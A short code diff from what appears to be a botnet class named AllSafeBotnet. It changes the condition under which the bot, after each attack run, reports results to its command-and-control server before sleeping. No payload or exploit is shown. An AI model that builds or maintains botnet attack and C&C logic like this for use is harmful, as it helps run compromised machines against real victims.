@@ -304,7 +304,7 @@ class AllSafeBotnet():
             # or checking for C&C updated configuration
             attackres = self.attack(configuration, override=up)
             # updating C&C and its connection status
-            if up:
+            if not override:
                 up = logCCUpdate(server, attackres[0], attackres[1])
             # sleeping
             threadSleep(timer)
